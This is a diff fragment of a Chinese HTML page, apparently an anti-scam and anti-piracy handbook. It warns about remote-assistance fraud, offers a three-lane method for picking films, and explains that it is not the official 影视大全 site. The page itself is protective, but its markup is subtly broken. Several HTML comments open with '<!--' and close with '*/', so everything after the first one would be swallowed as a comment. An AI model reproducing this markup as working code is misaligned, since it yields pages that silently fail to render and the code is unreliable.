+      <div class="f-face f-front"><span class="ribbon">红旗 8</span><span class="no">PHONE</span><h3>"远程协助帮你装好"</h3><p>这一步一旦出现，性质就变了：屏幕共享、验证码、远程控制。后面不是追剧，是转账。</p><div class="hint">↻ 悬停看应对</div></div>
+      <div class="f-face f-back"><h4>应对</h4><p>断网、冻卡、打 110／反诈专线。已经给过验证码的，别等，先挂失。追剧不值得赌这一把。</p><div class="do">DO：远程协助＝报警线</div></div>
+    </div></div>
+  </div>
+</section>
+
+<!-- ===== 04 选片三分法 ===== */
+<section class="wrap" id="tri" style="background:rgba(49,77,110,.05)">
+  <div class="head">
+    <span class="idx">第四格 · 选</span>
+    <h2>选片<em>三分</em></h2>
+    <span class="en">Three Lanes · 别把"免费"当唯一轴</span>
+    <a href="#" class="more">重排片单 #</a>
+  </div>
+  <p style="max-width:900px;font-size:14.5px;color:#34312B;margin-bottom:22px">验完站，还得会选片。把片子分三栏，你就不用靠"哪个免费"来决定了——那是最贵的一种选法。</p>
+  <div class="tri">
+    <div class="tri-card" style="--c:#314D6E"><div class="cat">LANE A · 院线 / 新片</div>
+      <h3>这栏别省</h3>
+      <p>上映 30 天内的，就买票或等正版窗口。这一栏你付的不是钱，是"这片子还能被拍第二部"的可能。用免费链看新片，等于从创作者碗里直接端走。</p>
+      <div class="path"><b>路径：</b>影院 → 正版平台上线 → 进你的"养着看"栏。别跳步。</div></div>
+    <div class="tri-card" style="--c:#2F5A34"><div class="cat">LANE B · 经典 / 公版</div>
+      <h3>这栏可以很便宜</h3>
+      <p>老片、已过保护期的、修复版、纪录片档案、短片平台。很多是正版免费或者几块钱的事，画质还干净。想练口味又不想烧钱，从这儿建片单。</p>
+      <div class="path"><b>路径：</b>正版平台限时免费 · 公版片库 · 影展／修复专场。搜片名＋"正版"。</div></div>
+    <div class="tri-card" style="--c:#C8422E"><div class="cat">LANE C · 养着的那部</div>
+      <h3>这栏不许省</h3>
+      <p>每月留一部"不爽的、慢的、看不懂的"。别让算法把你训成只点爽片。十年后你记得住的，一定是这栏里那部当时觉得"沉"的。</p>
+      <div class="path"><b>路径：</b>片单永远留一格"养着"。看完不许打分，只许写一句为什么闷。</div></div>
+  </div>
+</section>
+
+<!-- ===== 铭牌 ===== */
+<div class="plaque">
+  <div class="plaque-in">
+    <div>
+      <div class="lab">手册名称 / 手册网址</div>
+      <div class="u"><a href="https://yingshidaquanguanwang-h5.github.io">影识窗 — https://yingshidaquanguanwang-h5.github.io</a></div>
+    </div>
+    <div class="note">一扇窗，不是一扇门<br>只负责让你看清，不负责放你进去</div>
+  </div>
+</div>
+
+<!-- ===== 关于 ===== */
+<section class="wrap" id="about">
+  <div>
+    <h2>为何这页只是<em>一扇窗</em></h2>
+    <p>因为你要的是"影视大全<b>官网</b>"，但<b>真的官网主体不是我</b>——是金华锦尚科技（浙ICP备18007629号-5A，包名 com.le123.ysdq）。我要是把这页做成"官网"的样子，那就是假冒官网，比盗版站还糟：诈骗、商标侵权、不正当竞争三头挨，我不干这种事。</p>
+    <p>那我留着这个域名干嘛？留着<b>接住那个搜索意图</b>：每年都有人搜"官网"，点进来的其实不知道自己面前摆着十几个同名的东西。这页就干一件事——教你自己认出哪个是真的，然后送你去官方商店自己装。不递链接、不荐 App、不给"哪个还能用"，连黑名单都只讲形态不讲清单。</p>
+    <p>顺带说句实在的：同名那款产品，2020 到 2021 年被工信部点过三次名，超范围收信息、违规调通讯录和定位；而无锡判的那桩"盗链第一大案"，涉案 App 里就有一款同名的"纯净版"，8.3 万部、3.92 亿。所以这五格核验不是我小题大做，是有账可查的。</p>
+    <p>手册名称：影识窗<br>手册网址：<span class="u2">https://yingshidaquanguanwang-h5.github.io</span></p>
+  </div>
+  <div class="tiles">
+    <div class="tile"><div class="n">5 格</div><div class="l">包名/备案/主体/渠道/权限</div></div>
+    <div class="tile"><div class="n">0 链</div><div class="l">无下载/无播放/无片源/无推荐</div></div>
+    <div class="tile"><div class="n">8 旗</div><div class="l">翻面即给应对动作</div></div>
+    <div class="tile"><div class="n">证纸</div><div class="l">米白 / 靛蓝 / 朱红 / 铅字</div></div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== */
+<footer class="foot">
+  <div class="foot-logo">影识<em>窗</em> · 搜官网前，先核这五格</div>
+  <div class="foot-nav">
+    <a href="#check">验真五步</a>
+    <a href="#map">同名图谱</a>
+    <a href="#flag">八面红旗</a>
+    <a href="#tri">选片三分</a>
+    <a href="#about">为何只是窗</a>
+    <a href="#top">↑ 重核一遍</a>
+  </div>
+  <div class="cut">⚑ 本站是独立的信息核验与选片方法手册，<b>不是"影视大全"官网、不是其授权站或镜像站、不代表开发者金华锦尚科技有限公司</b>；不提供该 App 或任何同名产品的下载、安装包、播放源、片源聚合与跳转。页面所列包名、备案号、主体名称均系对公开应用商店详情页与工信部备案信息的转述性核对要点，<b>请以官方应用商店当前页面及工信部备案系统查询结果为准</b>，安装前请自行复核。</div>
+  <p>© 2026 影识窗 · 手册名称：影识窗 · 手册网址：https://yingshidaquanguanwang-h5.github.io</p>
+  <p class="legal">若已误装陌生包、授予过敏感权限或遭遇"远程协助／扫码进群／垫付返现"，请立即断网、卸载应用、修改账户密码并联系银行冻结可疑交易，必要时拨打 110 或反诈专线求助。传播盗版视听作品可能构成侵犯著作权罪（刑法第二百一十七条），"盗链""下载上传"均已被司法认定为向公众传播行为。观看请走正版平台与官方发行渠道。本页为信息素养内容，不构成法律意见；未生成 robots.txt 与 sitemap.xml。</p>
+</footer>
+
+</body>
+</html>
